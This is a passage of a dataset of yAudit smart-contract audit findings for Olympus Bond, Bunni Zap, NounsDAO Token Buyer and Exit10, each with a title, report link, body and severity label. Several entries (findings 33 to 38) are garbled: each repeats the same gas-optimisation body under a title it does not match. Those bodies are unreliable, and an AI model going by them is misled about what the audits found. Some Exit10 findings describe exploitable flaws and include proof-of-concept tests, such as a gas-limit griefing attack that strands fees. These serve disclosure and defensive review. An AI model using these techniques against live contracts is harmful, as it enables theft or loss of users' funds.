https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "33. Expired markets are never \"closed\"", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "34. Legitimate tokens disallowed", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "35. Tokens with non-string metadata disallowed", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "36. vesting and expiry sometimes used interchangeably", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "37. market price functions consistency", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "38. Use variable instead of magic numbers", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2022-Ohm-Bond.md", "body": "The _tune() function in BaseGauge.sol contains https://github.com/OlympusDAO/bonds/blob/1550298fe9618e861201787cd7fc2648566cf6af/src/bases/BondBaseCDA.sol#L532-L539 if (newControlVariable >= controlVariable) { terms[id_].controlVariable = newControlVariable; } else { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } By switching around the if/else clauses, we can replace the compound operator with a simple one if (newControlVariable < controlVariable) { // If decrease, control variable change will be carried out over the tune interval // this is because price will be lowered uint256 change = controlVariable - newControlVariable; adjustments[id_] = Adjustment(change, time_, meta.tuneAdjustmentDelay, true); } else { terms[id_].controlVariable = newControlVariable; } There are likely other instances of this gas savings in the code, but only one example was identified for illustrative purposes.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Add token revocation to functions granting approval", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Bunni-Zap.md", "body": "Currently only enterWithUnderlying() and enterWithVaultShares() revoke token approval after the function has finished executing.", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "2. nonReentrant isn't needed", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Bunni-Zap.md", "body": "nonReentrant is usually needed when a function is manipulating state variables that are used in other functions. In this case, the functions listed below are not manipulating state variables that are used in other functions, so the nonReentrant modifier is not needed. List of functions: zapIn in BunniLpZapIn.sol line 79 zapInNoStake in BunniLpZapIn.sol line 155 enterWithUnderlying in BunniLpZapIn.sol line 221 enterWithVaultShares in BunniLpZapIn.sol line 255 doZeroExSwap in BunniLpZapIn.sol line 309", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "3. Payable functions don't receive ETH", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Bunni-Zap.md", "body": "The following functions are marked as payable but are not used as such: doZeroExSwap in BunniLpZapIn.sol line 309 selfPermit in SelfPermit.sol line 36 selfPermitIfNecessary in SelfPermit.sol line 40 selfPermitAllowed in SelfPermit.sol line 47 selfPermitAllowedIfNecessary in SelfPermit.sol line 54", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "4. Add events to functions", "html_url": "https://github.com/yAudit/reports/blob/main/md/03-2022-Bunni-Zap.md", "body": "While the underlying dependencies in each function of the BunniLpZapIn contract emit events, the functions themselves do not emit events.", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. Price range should be within Chainlink's range", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "PriceFeed.sol#L93", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. ETH buyer pays the gas cost of debt payments", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "TokenBuyer.sol#L195, TokenBuyer.sol#L235", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "3. Can require the basis point values to be less than 10_000", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "TokenBuyer.sol#L146-L148", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "4. Use a two-step Ownership transfer pattern", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "TokenBuyer.sol, Payer.sol", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "5. Existing debts should be prioritized in sendOrRegisterDebt()", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "Payer.sol#L100", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "6. Risk of USDC depeg", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "DeployTokenBuyer.s.sol", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "7. Fee-on-transfer token not supported", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "TokenBuyer.sol", "labels": ["yAudit", "Severity: Low", "Difficulty: n/a"]}, {"title": "8. Replace owner() with msg.sender in withdrawPaymentToken()", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "Payer.sol#L123", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "9. Cache totalDebt in payBackDebt()", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "Payer.sol#L158, Payer.sol#L173", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "10. Use _debtAmount instead of debt.amount", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "Payer.sol#L146-L152", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "11. DebtQueue.empty() can just check for equality", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "DebtQueue.sol#L112", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "12. Precompute decimal factor to save gas and avoid magic numbers", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "TokenBuyer.sol#L292, TokenBuyer.sol#L323", "labels": ["yAudit", "Severity: Gas", "Difficulty: n/a"]}, {"title": "13. TokenBuyer may not use the entire received amount to pay the debt", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "TokenBuyer.sol#L235-L237", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "14. TokenBuyer's constructor can fetch paymentToken from payer", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "TokenBuyer.sol#L153", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "15. DebtDeque's _begin and _end can be uint128", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "DebtQueue.sol#L30-L44", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "16. Review tokens before supporting them via TokenBuyer", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "Repo", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "17. onlyAdmin() is not used", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "TokenBuyer.sol#L120-L125", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "18. Consider solidity 0.8.16 or higher", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "Example: TokenBuyer.sol#L16", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "19. Consider adding events for creating and paying back the debt if the debt is paid back on creation", "html_url": "https://github.com/yAudit/reports/blob/main/md/10-2022-NounsDAO-Token-Buyer.md", "body": "Payer.sol#L100", "labels": ["yAudit", "Severity: Informational", "Difficulty: n/a"]}, {"title": "1. _getPercentFromTarget() called with incorrect argument", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "_getPercentFromTarget() calculates a return value that represents a percent value. The calculation can be summarized as (x / bootstrapTargetLiquidity) * 100%. This ratio and the context of this line of coe indicates that x should be the current bootstrap liquidity held by the protocol. The current code does not use the current bootstrap liquidity value and therefore needs modification.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "2. Incorrect value in _safeTokenClaim()", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The ratio of rewards that a user can claim to the total rewards supply should be the same as the ratio of tokens that the user holds to the total token supply. This is how the _safeTokenClaim() logic works in the first step. The second step involves a correction to the rewards that a user can claim if the total claimed rewards exceed the total supply of rewards. This is how the logic should work, but this line of code actually checks if the total claimed rewards exceed the total supply of EXIT, BOOT, or other tokens. The total supply of tokens should not be involved in this calculation, the total supply of rewards should be used.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "3. bootstrapBucket fees are double counted in claimAndDistributeFees()", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "To summarize the fee collection logic that is currently implemented in claimAndDistributeFees(), assume: amountCollected0 = 100 bootstrapFees0 = 10 (this implies bootstrap liquidity is 10% of the total Exit10 liquidity) amountCollected0 passed to FeeSplitter.collectFees() = 90 (100 - 10 = 90) The amount of fees passed to FeeSplitter.collectFees() is 90 (this is the amountCollected0 value from the previous calculation). This value is then distributed by the ratio of pending bucket's liquidity over the total liquidity (the sum of liquidity of all buckets), which is 70%. If pendingBucket is 70% of liquidity while remainingBuckets are 30% of liquidity, then assuming the original 100 of fees, pendingBucket should get 70% of fees, in this example, 70 worth of fees. But because only 90 worth of fees is passed in collectFees(), pendingBucket instead gets 70% of 90, 63. The result is that pendingBucket is penalized while the bootstrap bucket gets counted twice and effectively gets double fees.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "4. Reinvested bootstrap fees are counted as fee-earning liquidity immediately", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Exit10.claimAndDistributeFees() collects and distributes the Uniswap LP fees between the different buckets in the Exit10 protocol. This distribution of rewards is calculated using the liquidity share owned by each bucket. The more liquidity that a bucket owns, the more fees that the bucket deserves. But the total Uniswap v3 LP liquidity is increased in this function and the newly added liquidity did not contribute to generating the fees that were just collected. Therefore the value of Exit10._exitBucket() is greater than the Exit bucket liquidity that is responsible for generating the collected fees. This means that the Exit bucket will receive a larger share of fees than it should and other buckets will be penalized.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "5. _depositAndSwap() should set non-zero amountOutMinimum values", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Uniswap v3 docs have this to say about amountOutMinimum: amountOutMinimum: we are setting to zero, but this is a significant risk in production. For a real deployment, this value should be calculated using our SDK or an onchain price oracle - this helps protect against getting an unusually bad price for a trade due to a front running sandwich or another type of price manipulation Exit10 sets a amountOutMinimum value of zero in several places, including in _depositAndSwap() and claimAndDistributeFees(). There is a risk of value loss due to MEV bots when the minimum value is set to zero.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "6. Unconsumed allowance will break fee updates", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "When the FeeSplitter is updating the rewards for the masterchef contracts, it first swaps USDC for WETH. This in turn calls swap() in Swapper.sol. This function uses safeApprove to give the Uniswap V3 Router permission to spend all of the USDC the FeeSplitter has given the Swapper. Importantly, the Swapper also creates a price limit and adds this as parameter in its call to the Uniswap V3 Router. The problem in this case combines two related truths: safeApprove requires that the previous allowance be completely spent or that it is called with a 0 value. Under any other circumstance it will revert. There is a non-zero chance that the call to the Uniswap V3 Router will not consume the entire allowance set by the call to safeApprove. Uniswap V3 Router's exactInputSingle function, which is what was called by the Swapper, calls exactInputInternal which itself calls swap directly on the pool with the provided parameters. As mentioned earlier, a price limit was included among these parameters. The swap function in Uniswap V3 then swaps in steps until it either has used the entire amountIn or it hits the price limit specified. If it hits the price limit specified before it hits the amountIn, there will be an unconsumed allowance and all subsequent calls to the Swapper's swap function will fail.", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "7. Exit10.sol ignores token order when sending fees to FeeSplitter.sol", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The call to collect() in the Uniswap pool will return collected fees as amount0 and amount1 which corresponds to the token0 and token1 of the pool. These amounts are eventually forwarded to the call to collectFees() in the FeeSplitter.sol contract. The third and fourth arguments are amountTokenOut and amountTokenIn, amountTokenOut should correspond to the \"token out\" (USDC) while amountTokenIn should correspond to the \"token in\" (ETH). The order here is important because FeeSplitter.sol use amountTokenOut as transfer amount for USDC. However, claimAndDistributeFees() ignores this order and simply sends amountCollected0 as amountTokenOut and amountCollected1 as amountTokenIn. This will work on Ethereum mainnet as the address of USDC is lower than the address of WETH, meaning token0 is \"token out\", but will fail on Optimism where the address of USDC is greater than the address of WETH. The following test simulates an scenario where token0 is WETH and token1 is USDC by forking Optimism. The call to claimAndDistributeFees() will revert as FeeSplitter.sol will try to pull more funds than available from the Exit10.sol contract. Full test suite is available here. function test_Exit10_claimAndDistributeFees_IncorrectTokenOrder() public { // We are on optimism where the token0/1 order in inverse to mainnet setUpOptimism(); // Skip bootstrap phase _skipBootstrap(); // Create a bond to provide some liquidity weth.approve(address(exit10), type(uint256).max); usdc.approve(address(exit10), type(uint256).max); deal(address(weth), address(this), 10 ether); deal(address(usdc), address(this), 10_000e6); _createBond(10 ether, 10_000e6); // Do some swaps to generate fees weth.approve(UNISWAP_V3_ROUTER, type(uint256).max); usdc.approve(UNISWAP_V3_ROUTER, type(uint256).max); _generateFees(usdc, weth, 1e12); // This function will claim fees from the pool and call collectFees() in FeeSplitter. // FeeSplitter will try to pull the tokens from Exit10 but will fail since the token order is wrong, // the call to collectFees() sends the USDC amount as the WETH amount and the WETH amount as the // USDC amount. As these amounts represent different magnitudes, the transaction will be reverted // since the Exit10 contract won't have those balances. For example, if fees are 500 USDC it will // try to pull 500 WETH from the Exit10 contract. vm.expectRevert(\"ERC20: transfer amount exceeds balance\"); exit10.claimAndDistributeFees(); }", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "8. Potential loss of collected fees during the call to claimAndDistributeFees()", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "When claimAndDistributeFees() is called, the function will collect fees from the Uniswap pool, which will send the funds to the caller contract. The implementation will then try to compound the proportion corresponding to the bootstrap bucket using increaseLiquidity(): https://github.com/open-bakery/exit10-protocol/blob/0b3c2782c5a93d2218234bc70fee31ec32f9e337/src/Exit10.sol#L439-L457 439: try 440: INPM(NPM).increaseLiquidity( 441: INPM.IncreaseLiquidityParams({ 442: tokenId: positionId, 443: amount0Desired: bootstrapFees0, 444: amount1Desired: bootstrapFees1, 445: amount0Min: 0, 446: amount1Min: 0, 447: deadline: DEADLINE 448: }) 449: ) 450: returns (uint128, uint256 amountAdded0, uint256 amountAdded1) { 451: unchecked { 452: amountCollected0 -= amountAdded0; 453: amountCollected1 -= amountAdded1; 454: } 455: } catch { 456: return; 457: } The external call is wrapped in a try/catch statement. The main issue is that if the call to increaseLiquidity() fails then the catch block will simply return from the function, which means the call to claimAndDistributeFees() will succeed. However, funds from fees have been already claimed but won't be sent to the FeeSplitter.sol contract. Additionally, this issue can be exploited by a bad actor using EIP-150 and the \"rule of 1/64th\". A bad actor can carefully choose the gas limit to make the call to increaseLiquidity() fail due out of gas, while still saving some gas in the main context to continue execution. The call to increaseLiquidity() will revert due to gas limits, and the catch block will be executed thanks to the saved gas. The following test reproduces the issue. We set up the liquidity and fees, and mock the call to increaseLiquidity() to make it revert. The fees will never reach the FeeSplitter.sol and will be stuck in Exit10.sol. Note: the following test requires a newer version of the Forge Standard Library in order to use vm.mockCallRevert(). It can be installed by executing forge install foundry-rs/forge-std --no-commit. function test_Exit10_claimAndDistributeFees_LossOfFeesIfIncreaseLiquidityReverts() public { // Generate liquidity and fees _bootstrapLock(10_000e6, 1 ether); _skipBootstrap(); _createBond(100_000e6, 10 ether); _generateFees(address(token0), address(token1), 1000e6); // Assume call to nonfungiblePositionManager.increaseLiquidity reverts vm.mockCallRevert( nonfungiblePositionManager, abi.encodeWithSelector(INPM.increaseLiquidity.selector), \"\" ); // Call function exit10.claimAndDistributeFees(); // FeeSplitter is empty uint256 feesClaimed0 = token0.balanceOf(feeSplitter); uint256 feesClaimed1 = token1.balanceOf(feeSplitter); assertEq(feesClaimed0, 0); assertEq(feesClaimed1, 0); // Fees are stuck in exit10 contract assertGt(token0.balanceOf(address(exit10)), 0); assertGt(token1.balanceOf(address(exit10)), 0); } In this other test we demonstrate the griefing scenario. Even if the call to increaseLiquidity() would succeed, a bad actor can arbitrarily exercise the issue by choosing a gas limit such that the call reverts due out of gas. The entire call to claimAndDistributeFees takes about ~360k units of gas, before calling increaseLiquidity() the gas cost is a bit more than 150k and the call to increaseLiquidity() itself takes a bit more than 50k gas. By choosing 200k units of gas we can get to point of calling increaseLiquidity(), but make this call fail due to out of gas since the forwarded gas will be less than 50k. function test_Exit10_claimAndDistributeFees_IntentionalRevert() public { // Generate liquidity and fees _bootstrapLock(10_000e6, 1 ether); _skipBootstrap(); _createBond(100_000e6, 10 ether); _generateFees(address(token0), address(token1), 1000e6); // Call function and supply a gas limit such that the call to \"increaseLiquidity()\" reverts due to OOG. // The function still continues execution since EIP150 will save 1/64 of available gas, enough to // execute the return in the catch clause. exit10.claimAndDistributeFees{gas: 200_000}(); // FeeSplitter is empty uint256 feesClaimed0 = token0.balanceOf(feeSplitter); uint256 feesClaimed1 = token1.balanceOf(feeSplitter); assertEq(feesClaimed0, 0); assertEq(feesClaimed1, 0); // Fees are stuck in exit10 contract assertGt(token0.balanceOf(address(exit10)), 0); assertGt(token1.balanceOf(address(exit10)), 0); }", "labels": ["yAudit", "Severity: High", "Difficulty: n/a"]}, {"title": "9. Using tick as price proxy is slightly inaccurate", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "_requireOutOfTickRange() is the key function that determines whether the price of ETH has reached a price above $10k and whether the Exit10 protocol's mission is complete. This function works by checking the WETH/USDC tick value and determining whether it is in the tick range or not. The tick values set in the environment variables are LOWER_TICK=184210 and UPPER_TICK=214170. We can do some math to check what ETH prices this corresponds to. // Step 1. calculate 1.0001^tickValue // Step 2. multiply by 10^-12 because of the USDC/WETH decimals conversion // Step 3. invert the value because of the order of WETH and USDC addresses 1 / ((1.0001**184210) * (10 ** -12)) = 10006.019136330182 1 / ((1.0001**214170) * (10 ** -12)) = 500.24195658614434 The chosen tick value that is used for the lower tick corresponds to a price of roughly $10006, which means that if the price of ETH only reaches $10005 before dropping below $10k, the exit10() function cannot be called. A tick value of 184216 or relying on slot0.sqrtPriceX96 instead of slot0.tick would be more precise, but using one of these values would then break the stated goal of holding only USDC when ETH arrives ta $10k because liquidity can only be removed at ticket intervals of 10 ticks. In summary, the protocol has 2 conflicting goals that are slightly mismatched: triggering exit10() when the price of ETH rises above $10k and holding only USDC at the same time that exit10() is called. One possible improvement for price data that would also protect against the situation of a USDC depeg event causing the price of ETH to appear to rise above $10k is to use Chainlink or another decentralized oracle solution for price data. Even if Chainlink is not the primary source of price data, it would be a useful secondary data source to validate that the Uniswap TWAP price is correct and that the price of ETH has indeed reached above 10k to allow exit10() to be called.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "10. Incorrect EXIT_DISCOUNT values", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The docs page describing the EXIT token describes a 5% discount on the EXIT token. But this value is not used consistently in the code. The value set in the .env file combined with the constant PERCENT_BASE value results in a much lower discount, only 0.05%.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "11. Problematic MasterchefExit rewards distribution to first EXIT staker", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "There are three problems with MasterchefExit.deposit(): Only the first staker to call deposit() receives rewards, which can lead to frontrunning of this function. A zero amount is permitted in deposit(), meaning the caller does not need to have any tokens. Because a zero amount is permitted in deposit(), pool.totalStaked will not increase after deposit() is called the first time with a zero amount, so deposit() can keep getting called with a zero amount by anyone until there is a non-zero value staked.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "12. Griefer can force bootstrap depositors to lose all funds if exit10() is triggered during the bootstrap phase", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "Within the bootstrapLock(..) function in the Exit10 contract, there is no check which prevents a user from calling it even after the exit10() function has been called and inExitMode has been set to true. The call to exit10() will set bootstrapBucketFinal to the current bootstrap funds - however an attacker is still able to call bootstrapLock(..), thus increasing the actual size of the bootstrap bucket to be greater than bootstrapBucketFinal. If the attacker deposits an amount equal to bootstrapBucketFinal, they will be able to trap all existing bootstrapper's deposits in the contract. To do so, they first call bootstrapLock(..) with this amount, and then call bootstrapClaim(). This function will call _safeTokenClaim() which has the following check which only allows an amount up to bootstrapBucketFinal to be claimed: _claim = (_claimed + _claim <= _supply) ? _claim : _supply - _claimed;. Thus, the attacker will be able to withdraw their own funds, leaving normal bootstrap depositors locked out of claiming.", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "13. Updating fees with zero amount can be used to dilute rewards", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "The updateFees() function present in FeeSplitter.sol is used to swap fees to ETH and feed those as rewards in Masterchef.sol. Doing so recalculates the reward rate to include the new amounts and extends the reward period by the configured rewards duration. This function can be abused by a malicious actor to dilute the reward process by calling it with a zero amount. This action won't increase the amount of rewards, but will extend the reward period, effectively lowering the reward rate. Current stakers will need to wait an additional period to claim their rewards. In this test, the issue is triggered each day using a reward duration of 10 days, and produces the following log: Logs: Logs: MC0 RewardRate: 599161603689814814814814814 MC0 PeriodFinish: 1684365053 MC1 RewardRate: 1048532902071511243386243386 MC1 PeriodFinish: 1684365053 ============================================= MC0 RewardRate: 556364346283399470899470898 MC0 PeriodFinish: 1684451453 MC1 RewardRate: 973637694780689011715797429 MC1 PeriodFinish: 1684451453 ============================================= MC0 RewardRate: 516624035834585222978080119 MC0 PeriodFinish: 1684537853 MC1 RewardRate: 904092145153496939450383326 MC1 PeriodFinish: 1684537853 ============================================= MC0 RewardRate: 479722318989257707051074396 MC0 PeriodFinish: 1684624253 MC1 RewardRate: 839514134785390015203927374 MC1 PeriodFinish: 1684624253 ============================================= MC0 RewardRate: 445456439061453585118854796 MC0 PeriodFinish: 1684710653 MC1 RewardRate: 779548839443576442689361133 MC1 PeriodFinish: 1684710653 ============================================= MC0 RewardRate: 413638121985635471896079453 MC0 PeriodFinish: 1684797053 MC1 RewardRate: 723866779483320982497263909 MC1 PeriodFinish: 1684797053 ============================================= MC0 RewardRate: 384092541843804366760645206 MC0 PeriodFinish: 1684883453 MC1 RewardRate: 672162009520226626604602201 MC1 PeriodFinish: 1684883453 ============================================= MC0 RewardRate: 356657360283532626277741977 MC0 PeriodFinish: 1684969853 MC1 RewardRate: 624150437411639010418559186 MC1 PeriodFinish: 1684969853 ============================================= MC0 RewardRate: 331181834548994581543617550 MC0 PeriodFinish: 1685056253 MC1 RewardRate: 579568263310807652531519244 MC1 PeriodFinish: 1685056253 ============================================= MC0 RewardRate: 307525989224066397147644867 MC0 PeriodFinish: 1685142653 MC1 RewardRate: 538170530217178534493553583 MC1 PeriodFinish: 1685142653 ============================================= MC0 RewardRate: 285559847136633083065670233 MC0 PeriodFinish: 1685229053 MC1 RewardRate: 499729778058808639172585469 MC1 PeriodFinish: 1685229053 =============================================", "labels": ["yAudit", "Severity: Medium", "Difficulty: n/a"]}, {"title": "14. Pool spot price manipulation allows to call exit10() before ETH reaches 10K", "html_url": "https://github.com/yAudit/reports/blob/main/md/04-2023-Exit10.md", "body": "In Exit10.exit10() it is checked inside _requireOutOfTickRange() whether the price of ETH has surpassed 10k by comparing the current tick to the upper or lower tick of the position range. function _requireOutOfTickRange() internal view { if (TOKEN_IN > TOKEN_OUT) { require(_currentTick() <= TICK_LOWER, 'EXIT10: Current Tick not below TICK_LOWER'); } else { require(_currentTick() >= TICK_UPPER, 'EXIT10: Current Tick not above TICK_UPPER'); } 